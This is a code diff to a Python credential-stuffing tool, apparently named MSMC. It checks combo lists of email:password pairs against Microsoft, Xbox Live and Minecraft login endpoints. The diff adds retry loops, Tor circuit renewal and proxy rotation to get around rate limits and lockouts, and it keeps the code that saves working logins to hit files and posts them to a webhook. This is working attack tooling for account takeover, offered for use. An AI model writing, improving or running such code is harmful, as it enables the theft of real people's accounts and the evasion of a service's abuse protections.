@@ -49,8 +49,9 @@ class Capture:
                 "username": "MSMC"
             }
             requests.post(webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
-        except: 
+        except Exception as e: 
             errors+=1
+            open(f"results/error.txt", 'a').write(f"Error: {e}\nLine: {traceback.extract_tb(e.__traceback__)[-1].lineno}")
 
     def hypixel(name):
         global errors
@@ -129,17 +130,24 @@ Access: {access}
 =======================\n''')
         Capture.notify(email, password, mc, oname, olevel, ofirstlogin, olastlogin, cape, capes, access, osbcoins, obwstars)
 
-def get_urlPost_sFTTag(session):
-    r = session.get(sFTTag_url, timeout=15)
-    text = r.text
-    match = re.match(r'.*value="(.+?)".*', text, re.S)
-    if match is not None:
-        sFTTag = match.group(1)
-        match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
-        if match is not None:
-            return match.group(1), sFTTag
-        else: return get_urlPost_sFTTag(session)
-    else: return get_urlPost_sFTTag(session)
+def get_urlPost_sFTTag(session, tries = 0):
+    global retries
+    while tries < maxretries:
+        try:
+            r = session.get(sFTTag_url, timeout=15)
+            text = r.text
+            match = re.match(r'.*value="(.+?)".*', text, re.S)
+            if match is not None:
+                sFTTag = match.group(1)
+                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
+                if match is not None:
+                    return match.group(1), sFTTag, session
+        except: pass
+        if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
+        session.proxy = getproxy()
+        retries+=1
+        tries+=1
+    return None
 
 def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
     global bad, checked, cpm, twofa, retries, checked
@@ -153,7 +161,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
                 if key == 'access_token':
                     token = requests.utils.unquote(value)
                     break
-            return token
+            return token, session
         #sec info change
         elif 'cancel?mkt=' in login_request.text:
             data = {'ipt':re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(), 'pprid':re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(), 'uaid':re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()}
@@ -166,13 +174,13 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
                     if key == 'access_token':
                         token = requests.utils.unquote(value)
                         break
-                return token
+                return token, session
         elif "tried to sign in too many times with an incorrect account or password." in login_request.text:
-            retries+=1
-            tries+=1
             if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
             session.proxy = getproxy()
             if tries < maxretries:
+                retries+=1
+                tries+=1
                 #if screen == "'2'": print(Fore.LIGHTRED_EX+f"Blocked, retrying: {email}:{password} {Fore.LIGHTBLACK_EX}[{str(tries)}/{str(maxretries)}]")
                 return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
             else:
@@ -180,7 +188,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
                 checked+=1
                 cpm+=1
                 if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-                return None
+                return None, session
         #2fa
         elif any(value in login_request.text for value in ["recover?mkt" , "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
             twofa+=1
@@ -188,37 +196,46 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
             cpm+=1
             if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
             with open(f"results/{fname}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
-            return None
+            return None, session
         #bad
         elif any(value in login_request.text for value in ["Your account or password is incorrect." , "That Microsoft account doesn't exist. Enter a different account" , "Sign in to your Microsoft account" ]):
             bad+=1
             checked+=1
             cpm+=1
             if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-            return None
+            return None, session
         #blocked, retry
         else:
-            retries+=1
-            tries+=1
             if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
             session.proxy = getproxy()
-            if tries < maxretries: return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
+            if tries < maxretries:
+                retries+=1
+                tries+=1
+                return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
             else:
                 bad+=1
                 checked+=1
                 cpm+=1
                 if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-                return None
+                return None, session
     except:
-        retries+=1
-        tries+=1
-        if tries < maxretries: return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
+        if tries < maxretries: 
+            retries+=1
+            tries+=1
+            return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
         else:
             bad+=1
             checked+=1
             cpm+=1
             if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-            return None
+            return None, session
+
+def validmail(email, password):
+    global vm, cpm, checked
+    vm+=1
+    cpm+=1
+    checked+=1
+    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
 
 def authenticate(email, password):
     global vm, bad, retries, checked, cpm
@@ -227,45 +244,40 @@ def authenticate(email, password):
         session = requests.Session()
         session.verify = False
         session.proxies = proxy
-        token = get_xbox_rps(session, email, password, *get_urlPost_sFTTag(session))
+        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
+        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
         if token is not None:
-            xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
-            js = xbox_login.json()
-            xbox_token = js.get('Token')
-            if xbox_token is not None:
-                uhs = js['DisplayClaims']['xui'][0]['uhs']
-                xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
-                js = xsts.json()
-                xsts_token = js.get('Token')
-                if xsts_token is not None:
-                    mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
-                    access_token = mc_login.json().get('access_token')
-                    if access_token is not None:
-                        mc, capes = account(access_token, session)
-                        if mc != None:
-                            Capture.handle(mc, email, password, capes)
-                        else:
-                            hits+=1
-                            cpm+=1
-                            checked+=1
-                            with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
-                            if screen == "'2'": print(Fore.GREEN+f"Hit: No Name Set | {email}:{password}")
-                            Capture.notify(email, password, "Not Set", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A")
-                    else:
-                        vm+=1
-                        cpm+=1
-                        checked+=1
-                        with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
-                else:
-                    vm+=1
-                    cpm+=1
-                    checked+=1
-                    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
-            else:
-                vm+=1
-                cpm+=1
-                checked+=1
-                with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
+            try:
+                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
+                js = xbox_login.json()
+                xbox_token = js.get('Token')
+                if xbox_token is not None:
+                    try:
+                        uhs = js['DisplayClaims']['xui'][0]['uhs']
+                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
+                        js = xsts.json()
+                        xsts_token = js.get('Token')
+                        if xsts_token is not None:
+                            try:
+                                mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
+                                access_token = mc_login.json().get('access_token')
+                                if access_token is not None:
+                                    mc, capes = account(access_token, session)
+                                    if mc != None:
+                                        Capture.handle(mc, email, password, capes)
+                                    else:
+                                        hits+=1
+                                        cpm+=1
+                                        checked+=1
+                                        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
+                                        if screen == "'2'": print(Fore.GREEN+f"Hit: No Name Set | {email}:{password}")
+                                        Capture.notify(email, password, "Not Set", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A")
+                                else: validmail(email, password)
+                            except: validmail(email, password)
+                        else: validmail(email, password)
+                    except: validmail(email, password)
+                else: validmail(email, password)
+            except: validmail(email, password)
     except Exception as e:
         #print(e)
         #traceback.print_exc()
@@ -311,7 +323,6 @@ def Proxys():
     global proxylist
     fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
     if fileNameProxy is None:
-        print()
         print(Fore.LIGHTRED_EX+"Invalid File.")
         time.sleep(2)
         Proxys()
@@ -375,7 +386,7 @@ def finishedscreen():
     os.abort()
 
 def renew_tor(port):
-    with Controller.from_port(port) as controller:
+    with Controller.from_port(address='127.0.0.1', port=port) as controller:
         controller.authenticate()
         controller.signal(Signal.NEWNYM)
         time.sleep(controller.get_newnym_wait())
@@ -391,16 +402,16 @@ def getproxy():
 def Checker(combo):
     global bad, checked, cpm
     try:
-        email, password = combo.replace('\n', '').replace(' ', '').split(":")
+        email, password = combo.strip().replace(' ', '').split(":")
         if email != "" and password != "":
             authenticate(str(email), str(password))
         else:
-            if screen == "'2'": print(Fore.RED+f"Bad: {combo}")
+            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
             bad+=1
             cpm+=1
             checked+=1
     except:
-        if screen == "'2'": print(Fore.RED+f"Bad: {combo}")
+        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
         bad+=1
         cpm+=1
         checked+=1
